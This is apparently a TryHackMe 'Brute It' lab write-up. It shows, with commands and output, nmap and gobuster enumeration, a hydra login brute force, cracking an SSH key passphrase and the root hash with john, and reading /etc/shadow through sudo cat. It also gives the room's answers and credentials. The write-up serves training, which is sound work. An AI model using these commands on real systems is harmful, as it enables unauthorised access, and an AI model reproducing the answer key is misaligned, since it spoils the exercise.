<p align="center">
  THM : Brute It<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/bruteit<br>
  <img src="https://i.imgur.com/cJ8NqJf.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Login page bruteforce](#login-page-bruteforce)
- [SSH passphrase cracking](#ssh-passphrase-cracking)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target :  
```
attacker@AttackBox:~/Brute_It$ nmap 10.10.210.1 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-18 14:26 CET
Nmap scan report for 10.10.210.1
Host is up (0.065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.87 seconds
```

**Question : How many ports are open ?**  
**Answer : 2**  

**Question : What version of SSH is running ?**  
**Answer : OpenSSH 7.6p1**  

**Question : What version of Apache is running ?**  
**Answer : 2.4.29**  

**Question : Which Linux distribution is running ?**  
**Answer : ubuntu**  

## Website enumeration

Let's use [gobuster](https://github.com/OJ/gobuster) to find hidden files and directories on the webserver :  
```
attacker@AttackBox:~/Brute_It$ gobuster dir -u http://10.10.210.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.210.1/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/18 14:30:27 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 310] [--> http://10.10.210.1/admin/]
```

**Question : What is the hidden directory ?**  
**Answer: /admin**  

Let's see what we can find at `/admin` using a web browser :  
![](https://i.imgur.com/GuQNItp.jpg)  

This is a login page. Let's take a look at the source code :  
![](https://i.imgur.com/tDps1MU.jpg)  

Now, we have a username `admin`.

## Login page bruteforce

Let's brute force this login page using [hydra](https://github.com/vanhauser-thc/thc-hydra). We already have the HTTP method of the login form : `POST`. We also have 
the name of the two parameters `user` and `pass` (We can see this 3 informations in the source code of the page above) :  
```
attacker@AttackBox:~/Brute_It$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.210.1 http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-18 14:39:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking http-post-form://10.10.210.1:80/admin/:user=^USER^&pass=^PASS^:Invalid
[80][http-post-form] host: 10.10.210.1   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-18 14:39:40
```

We have the password for `admin` user !  

**Question : What is the user:password of the admin panel ?**  
**Answer : admin:xavier**  

Now, let's use those credentials and see what we can find on port 80 :  
![](https://i.imgur.com/0wBa6AD.jpg)  

We have the web flag !  
**Question : Web flag**  
**Answer : THM{*HIDDEN*}**  

Let's get the private key :  
![](https://i.imgur.com/7iiDi9G.jpg)  

We can try to use this private key to login on SSH as `john` :  
```
attacker@AttackBox:~/Brute_It$ nano id_rsa
attacker@AttackBox:~/Brute_It$ chmod 600 id_rsa 
attacker@AttackBox:~/Brute_It$ ssh john@10.10.210.1 -i id_rsa 
The authenticity of host '10.10.210.1 (10.10.210.1)' can't be established.
ECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.210.1' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

We need a passphrase...

## SSH passphrase cracking

Let's try to crack the passphrase for the private key we found. First, we need to extract a hash from it :  
```
attacker@AttackBox:~/Brute_It$ ssh2john id_rsa > hash.txt
attacker@AttackBox:~/Brute_It$ cat hash.txt 
id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f2f99de666d32ae4d9008e2765a25d59b70331bf00f2e3bf038f135067b791fdca109aada38f7b4178a1fd0173999434305077e61260705c734af364e9ff6796fd293ca6c2e7804b2f0153cb7b1792e5002bb3ec063d9a7572957589273702754154ec5a078bb3cd35d48cfd87f19ebc6b7e01f2d31d7a3d0c2c70b5294716aa0ca2fcc76aea5f077a89413146dc173a80bdb566f3ee838593ef738174d1bce50ef5b6ddbda923846b688f1f9c45c7b72eab7e426e1cd551f8df1975a61904e0ddfe7d1ad1f4d0d4ddfad4a146af9105ecb5f8a8a273d9c3f69bbab148f9ad64083319abd4475243bc25f3ca36cf79c591cb472e0a6a7c042f8f778b37cb76fab6a36e85aac97d9499e81d1e37df7ddba2799deec6d419b23ef3e3ef06f92ae5b5c8a1a7df60cbfc19fe6b8a117969e01cc2c3a3fe319b1789ae99ada2fc2624e5e8e68f94784537cb0afeb140497375bca1439735f4308dd357324815b297fcc3b6c679cb9c15d988d2c0e2606364e6ebe6c148ee91f54b4fd24f30df213a7b3ba27c3ef47f8560551b11e58ebbb429a86453658a0a26b5d2af3208dd8166c44f6edd41cb3aaa83508b078c771c9a7ab1cd10d27e406403a22d22ac79e7e704d1fd2c7687d7b6fcef0915816b9185681b4d26117de342f1f717db770384673043c1866f16fddcd5578f4d3d30bd6c9bbe8d2a2537dab81d7244633597ba1c076c221e06414f13d50e36f8a9f553f0534f7f5ec3cff0634435082a832eee04e27e99c1fa2c38e3d716db2e77f14f8e98ea891399b2abe53422463dcb27600c1eaeb86adf900629e8d0ef3c5ef53e088085caf38201ae0eada38b3a1e1f53aaf72bede299f743c77c12fb82b37db8eb89793bedb0f93d807a23e5ef8fb1ce48466b511c3c96afa63a208a8d04e550046af87a61e6bfae21ce1de32241d42533eb4d0ba60ead50c4522703199195a1144e6768036e387ac4465ec6a29cf439adf496c97d8a1b046ef4d950bb129c621c678998967f7035c50e12759419e417caa199342dce21281320770fcca252f5bcc516991a53909d95a2932286b49448ac666f39c0fa04a412cd8a28dfabcd3cae14ed00152d1c8d0c7c9e613a3c2f336cc746836eed6b502fbcdc3c89c1423138299de963c28fcd29fe69e78dc178db0c20395b5776e7a44015d9e4aa70be65e36feca8c8f0a025b895c3052d9a065c50df01cd0f281703d74eccd4620363839445823fcc0584eb68be9560301ea67e18a3075a025bf733c20244a43719b40457a6429a20ca00cc772b7549a6c638695e766aee71e37768e9edf1c93491ec4d9b7ec51b9738f66fe9995eb9b1b2df970d4eaec756bd4eb96e9d37092592562ab31310be0b4563f0474b6c6f6e6d3ae52be833ff1ebe7630b68b835c88191f35711f96
```

Now, we can use [john](https://www.openwall.com/john/doc/) to crack it :  
```
attacker@AttackBox:~/Brute_It$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2023-01-18 14:50) 11.11g/s 806755p/s 806755c/s 806755C/s rubendario..rock07
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we have the passphrase for the private key ! Let's try to login on SSH again :  
```
attacker@AttackBox:~/Brute_It$ ssh john@10.10.210.1 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 18 13:52:07 UTC 2023

  System load:  0.0                Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.210.1
  Swap usage:   0%

63 packages can be updated.
0 updates are security updates.

Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$
```

We are logged in as `john` ! Let's get the `user.txt` flag :  
```
john@bruteit:~$ cat user.txt 
THM{***********************}
```

**Question : What is John's RSA Private Key passphrase ?**  
**Answer : rockinroll**  

**Question : user.txt**  
**Answer : THM{*HIDDEN*}**  

## Privilege escalation

Now, it's time to get root. Let's see if we have any sudo right :  
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

We can run `cat` as root without any password. Let's see on [GTFOBins](https://gtfobins.github.io/) if we can do something with it :  
![](https://i.imgur.com/q2tThqt.jpg)  

We can read sensitive files... Let's read `/etc/shadow` :  
```
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

There is 3 hashes in this file. Maybe we can crack the hash of `root` user :  
```
attacker@AttackBox:~/Brute_It$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE4.1 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
football         (?)     
1g 0:00:00:00 DONE (2023-01-18 14:58) 2.631g/s 336.8p/s 336.8c/s 336.8C/s 123456..diamond
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have the password for `root` user ! Let's use `su root` with the password we just found and get the root flag :  
```
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cd /root
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt 
THM{********************}
```

**Question : What is the root's password ?**  
**Answer : football**  

**Question : root.txt**  
**Answer : THM{*HIDDEN*}**  

## Conclusion

In this room, we practiced : 
- Ports/Services enumeration using [nmap](https://nmap.org/book/man.html)
- Basic website enumeration using [gobuster](https://github.com/OJ/gobuster)
- Basic login form bruteforce using [hydra](https://github.com/vanhauser-thc/thc-hydra)
- SSH private key passphrase cracking using [john](https://www.openwall.com/john/doc/)
- Basic linux enumeration
- Basic hash cracking using [john](https://www.openwall.com/john/doc/)

Thanks for this room ! And thanks for reading my write ups ! 
